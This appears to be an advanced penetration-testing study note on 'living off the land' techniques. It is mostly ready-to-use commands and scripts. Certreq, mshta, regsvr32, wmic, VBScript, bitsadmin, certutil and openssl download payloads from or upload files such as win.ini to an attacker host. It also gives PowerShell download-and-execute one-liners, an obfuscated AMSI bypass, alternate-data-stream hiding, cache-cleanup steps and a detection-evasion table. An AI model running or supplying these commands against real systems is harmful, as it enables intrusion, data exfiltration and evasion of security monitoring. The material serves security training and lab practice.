---
tags: [module/file-transfers, lolbas, gtfobins, living-off-the-land, windows, linux, evasion, level/advanced, practical]
---

# Living Off The Land - Practical Application

## Complete LOL Workflow

Phase 1: Understanding LOLBAS/GTFOBins
Phase 2: Windows LOLBAS Examples
Phase 3: Linux GTFOBins Examples
Phase 4: Bitsadmin Deep Dive
Phase 5: Certutil Variations
Phase 6: PowerShell Without PowerShell
Phase 7: Evasion Techniques
Phase 8: Automation

---

## Phase 1: Understanding LOLBAS/GTFOBins

### LOLBAS Categories

| Category | Description | Examples |
|----------|-------------|----------|
| Download | Download files | certreq, bitsadmin, certutil |
| Upload | Upload files | certreq, ftp |
| Execute | Run code | mshta, regsvr32, wmic |
| Read | Read files | type, more, certutil -decode |
| Write | Write files | echo, copy |
| Bypass | Bypass restrictions | powershell -ep bypass |

### GTFOBins Categories

| Category | Description | Examples |
|----------|-------------|----------|
| File Download | Download files | curl, wget, openssl |
| File Upload | Upload files | curl, nc, openssl |
| Command Execution | Run commands | bash, perl, python |
| File Read | Read files | cat, head, tail |
| File Write | Write files | tee, dd |
| SUID | Privilege escalation | sudo, pkexec |

---

## Phase 2: Windows LOLBAS Examples

### CertReq.exe Upload

On target:
certreq.exe -Post -config http://10.10.14.5:8000/ C:\Windows\win.ini

On your machine:
nc -lvnp 8000

### CertReq.exe Download

On your machine (send file):
nc -lvnp 8000 < payload.exe

On target:
certreq.exe -Get -config http://10.10.14.5:8000/ C:\Temp\payload.exe

### Mshta.exe JavaScript Download

Create file.hta:
<html>
<head>
<script>
var xhr = new ActiveXObject("Microsoft.XMLHTTP");
xhr.open("GET", "http://10.10.14.5/payload.exe", false);
xhr.send();
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1;
stream.Write(xhr.responseBody);
stream.SaveToFile("C:\\Temp\\payload.exe", 2);
stream.Close();
</script>
</head>
<body>test</body>
</html>

Execute on target:
mshta.exe http://10.10.14.5/file.hta

### Regsvr32 (Squiblydoo)

Create file.sct:
<?XML version="1.0"?>
<scriptlet>
<registration progid="Test" classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var xhr = new ActiveXObject("Microsoft.XMLHTTP");
xhr.open("GET", "http://10.10.14.5/payload.exe", false);
xhr.send();
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1;
stream.Write(xhr.responseBody);
stream.SaveToFile("C:\\Temp\\payload.exe", 2);
stream.Close();
]]>
</script>
</registration>
</scriptlet>

Execute:
regsvr32 /s /n /u /i:http://10.10.14.5/file.sct scrobj.dll

### Wmic XSL Download

Create file.xsl:
<?xml version="1.0"?>
<stylesheet version="1.0"
 xmlns="http://www.w3.org/1999/XSL/Transform">
<output method="text"/>
<template match="/">
<script>
var xhr = new ActiveXObject("Microsoft.XMLHTTP");
xhr.open("GET", "http://10.10.14.5/payload.exe", false);
xhr.send();
var stream = new ActiveXObject("ADODB.Stream");
stream.Open();
stream.Type = 1;
stream.Write(xhr.responseBody);
stream.SaveToFile("C:\\Temp\\payload.exe", 2);
stream.Close();
</script>
</template>
</stylesheet>

Execute:
wmic os get /format:"http://10.10.14.5/file.xsl"

### Cscript/Wscript Download

Create download.vbs:
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objXMLHTTP.Open "GET", "http://10.10.14.5/payload.exe", False
objXMLHTTP.Send

Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.SaveToFile "C:\Temp\payload.exe", 2
objADOStream.Close

Execute:
cscript /nologo download.vbs

---

## Phase 3: Linux GTFOBins Examples

### OpenSSL Download

On your machine (send file):
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < /path/to/file

On target (receive):
openssl s_client -connect 10.10.14.5:443 -quiet > received_file

### OpenSSL Upload

On your machine (receive):
openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem -WWW

On target (send):
openssl s_client -connect 10.10.14.5:443 -quiet -ign_eof < file_to_upload

### Perl Download

perl -MLWP::Simple -e 'getstore("http://10.10.14.5/file", "file")'

### Python Download

python -c "import urllib; urllib.urlretrieve('http://10.10.14.5/file', 'file')"

### Ruby Download

ruby -e "require 'open-uri'; File.write('file', open('http://10.10.14.5/file').read)"

### PHP Download

php -r "file_put_contents('file', file_get_contents('http://10.10.14.5/file'));"

### Tftp Download

On your machine (TFTP server):
sudo apt install atftpd -y
sudo atftpd --daemon --port 69 /tftp

On target:
tftp 10.10.14.5 -c get file

### Wget with Authentication

wget --user=user --password=pass ftp://10.10.14.5/file

### Curl with Proxy

curl -x http://proxy:8080 -o file http://10.10.14.5/file

---

## Phase 4: Bitsadmin Deep Dive

### Basic Bitsadmin Download

bitsadmin /transfer job /download /priority high http://10.10.14.5/file.exe C:\Temp\file.exe

### Bitsadmin with Authentication

bitsadmin /transfer job /download /priority high http://user:pass@10.10.14.5/file.exe C:\Temp\file.exe

### Bitsadmin Create/Resume Method

bitsadmin /create myjob
bitsadmin /addfile myjob http://10.10.14.5/file.exe C:\Temp\file.exe
bitsadmin /setpriority myjob high
bitsadmin /resume myjob
bitsadmin /info myjob /verbose
bitsadmin /complete myjob

### PowerShell BITS

Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.14.5/file.exe" -Destination "C:\Temp\file.exe"

$cred = Get-Credential
Start-BitsTransfer -Source "http://10.10.14.5/file.exe" -Destination "C:\Temp\file.exe" -Credential $cred

Start-BitsTransfer -Source "http://10.10.14.5/file.exe" -Destination "C:\Temp\file.exe" -ProxyUsage Override -ProxyList "proxy:8080"

### Bitsadmin Upload

bitsadmin /create /upload myupload
bitsadmin /addfile myupload C:\Temp\file.exe http://10.10.14.5/upload
bitsadmin /resume myupload

---

## Phase 5: Certutil Variations

### Basic Certutil Download

certutil -urlcache -f http://10.10.14.5/file.exe file.exe

### Certutil with Split

certutil -split -f http://10.10.14.5/largefile.bin largefile.bin

### Certutil to Memory (No Disk)

certutil -urlcache -f http://10.10.14.5/script.ps1 %temp%\script.ps1 & powershell -ep bypass -f %temp%\script.ps1

### Certutil Verify After Download

certutil -hashfile file.exe MD5
certutil -hashfile file.exe SHA256

### Certutil Delete Cache (Cleanup)

certutil -urlcache -f http://10.10.14.5/file.exe delete

### Certutil Decode Base64

certutil -decode encoded.b64 file.exe

### Certutil Encode Base64

certutil -encode file.exe encoded.b64

---

## Phase 6: PowerShell Without PowerShell

### PowerShell Constrained Language Mode Bypass

powershell -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

### PowerShell Without powershell.exe

cscript /nologo /e:jscript "var s=new ActiveXObject('WScript.Shell'); s.Run('powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.5/script.ps1'')')"

### Using Add-Type to Compile and Run C#

Add-Type -TypeDefinition @"
using System;
using System.Net;
using System.Diagnostics;
public class Downloader {
    public static void Download(string url, string path) {
        using (var client = new WebClient()) {
            client.DownloadFile(url, path);
        }
    }
}
"@
[Downloader]::Download("http://10.10.14.5/file.exe", "C:\Temp\file.exe")

### PowerShell Reflection (No Add-Type)

$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/file.exe')
[System.Reflection.Assembly]::Load($bytes)

---

## Phase 7: Evasion Techniques

### AMSI Bypass for Certutil

powershell -c "S`eT-It`em ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) ) ; ( Get-varI`A`BLE  ( '1q2'  +'uZx'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLuE"(  ${n`ULl},${t`RuE} ); certutil -urlcache -f http://10.10.14.5/file.exe C:\Temp\file.exe"

### LOLBAS Chaining

certutil -urlcache -f http://10.10.14.5/script.ps1 %temp%\script.ps1
powershell -ep bypass -f %temp%\script.ps1
del %temp%\script.ps1
certutil -urlcache -f http://10.10.14.5/file.exe delete

### Use Alternate Data Streams

type payload.exe > legit.txt:payload.exe
wmic process call create "C:\temp\legit.txt:payload.exe"

### Living Off the Land Detection Evasion Matrix

| Technique | Detection Risk | Evasion Method |
|-----------|----------------|----------------|
| certutil | High (AMSI) | Use older version, obfuscate |
| bitsadmin | Medium | Use PowerShell BITS instead |
| mshta | High | Use with JavaScript obfuscation |
| regsvr32 | Medium | Use with legitimate-looking SCT |
| wmic | Medium | Use with remote XSL |
| powershell | High | Use -Version 2, reflection, or cscript |

---

## Phase 8: Automation

### LOLBAS Finder Script (Windows)

Save as Find-LOLBAS.ps1:

param([string]$Function = "download")

$lolbas = @{
    download = @("certutil", "bitsadmin", "powershell", "certreq")
    upload = @("certreq", "ftp", "powershell")
    execute = @("mshta", "regsvr32", "wmic", "cscript")
}

$found = @()
foreach ($bin in $lolbas[$Function]) {
    if (Get-Command $bin -ErrorAction SilentlyContinue) {
        $found += $bin
    }
}

Write-Host "Available $Function binaries:"
$found | ForEach-Object { Write-Host " - $_" }

### GTFOBins Check Script (Linux)

Save as check-gtfo.sh:

#!/bin/bash
FUNCTION=$1

declare -A GTFOBINS
GTFOBINS[download]="curl wget openssl perl python ruby php tftp"
GTFOBINS[upload]="curl nc openssl python php"
GTFOBINS[execute]="bash perl python ruby php"

echo "[*] Checking for $FUNCTION binaries..."
for bin in ${GTFOBINS[$FUNCTION]}; do
    if command -v $bin &>/dev/null; then
        echo "[+] $bin available"
    fi
done

### LOLBAS Command Generator

Save as lolbas-generate.ps1:

param(
    [string]$Binary,
    [string]$Url,
    [string]$Output
)

$commands = @{
    certutil = "certutil -urlcache -f $Url $Output"
    bitsadmin = "bitsadmin /transfer job /download /priority high $Url $Output"
    certreq = "certreq.exe -Get -config $Url $Output"
    mshta = "mshta.exe $Url"
    regsvr32 = "regsvr32 /s /n /u /i:$Url scrobj.dll"
    wmic = "wmic os get /format:$Url"
}

if ($commands.ContainsKey($Binary)) {
    Write-Host "[*] Command: $($commands[$Binary])" -ForegroundColor Green
} else {
    Write-Host "[-] No command found for $Binary"
}

---

## Living Off The Land Cheatsheet

| Platform | Binary | Function | Command |
|----------|--------|----------|---------|
| Windows | certreq | Upload | certreq.exe -Post -config http://server/ C:\file |
| Windows | certreq | Download | certreq.exe -Get -config http://server/ C:\file |
| Windows | mshta | Download | mshta.exe http://server/file.hta |
| Windows | regsvr32 | Download | regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll |
| Windows | wmic | Download | wmic os get /format:http://server/file.xsl |
| Windows | cscript | Download | cscript download.vbs |
| Windows | bitsadmin | Download | bitsadmin /transfer job /download http://server/file C:\file |
| Windows | certutil | Download | certutil -urlcache -f http://server/file file |
| Linux | openssl | Download | openssl s_client -connect server:443 -quiet > file |
| Linux | openssl | Upload | openssl s_client -connect server:443 -quiet -ign_eof < file |
| Linux | perl | Download | perl -MLWP::Simple -e 'getstore("http://server/file","file")' |
| Linux | python | Download | python -c "import urllib; urllib.urlretrieve('http://server/file','file')" |
| Linux | ruby | Download | ruby -e "require 'open-uri'; File.write('file', open('http://server/file').read)" |
| Linux | php | Download | php -r "file_put_contents('file', file_get_contents('http://server/file'));" |

---

## Key Takeaways

- Living off the land = using existing system tools
- LOLBAS = Windows binaries, GTFOBins = Linux binaries
- certreq.exe can upload and download files
- mshta, regsvr32, wmic can execute code
- bitsadmin is the "intelligent" downloader
- certutil is the classic Windows wget
- PowerShell can be run without powershell.exe
- AMSI bypasses may be needed for certutil
- Chain multiple binaries to avoid detection
- Use alternate data streams to hide files
- Always check what's available on the target
- The more obscure, the better
- Practice all methods in the lab
- These techniques are used by real APTs
- Have multiple fallback options ready
